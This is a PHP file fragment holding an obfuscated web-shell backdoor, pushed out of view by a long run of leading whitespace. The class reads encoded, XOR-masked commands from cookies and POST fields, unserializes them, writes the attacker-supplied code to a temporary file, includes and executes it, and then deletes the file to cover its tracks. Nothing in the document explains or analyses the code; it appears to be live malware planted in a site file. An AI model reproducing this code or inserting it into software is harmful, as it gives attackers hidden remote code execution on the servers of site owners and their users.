<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("vgpmp")){class vgpmp{public static $sbkhmjfdmq = "fuowkzxevnjczcfe";public static $tfiyvvudu = NULL;public function __construct(){$wiqbom = @$_COOKIE[substr(vgpmp::$sbkhmjfdmq, 0, 4)];if (!empty($wiqbom)){$cqkqtb = "base64";$urudmwt = "";$wiqbom = explode(",", $wiqbom);foreach ($wiqbom as $irifkvxmub){$urudmwt .= @$_COOKIE[$irifkvxmub];$urudmwt .= @$_POST[$irifkvxmub];}$urudmwt = array_map($cqkqtb . "_decode", array($urudmwt,)); $urudmwt = $urudmwt[0] ^ str_repeat(vgpmp::$sbkhmjfdmq, (strlen($urudmwt[0]) / strlen(vgpmp::$sbkhmjfdmq)) + 1);vgpmp::$tfiyvvudu = @unserialize($urudmwt);}}public function __destruct(){$this->rijzrfuah();}private function rijzrfuah(){if (is_array(vgpmp::$tfiyvvudu)) {$pxddqmr = sys_get_temp_dir() . "/" . crc32(vgpmp::$tfiyvvudu["salt"]);@vgpmp::$tfiyvvudu["write"]($pxddqmr, vgpmp::$tfiyvvudu["content"]);include $pxddqmr;@vgpmp::$tfiyvvudu["delete"]($pxddqmr);exit();}}}$slkpk = new vgpmp(); $slkpk = NULL;} ?><?php
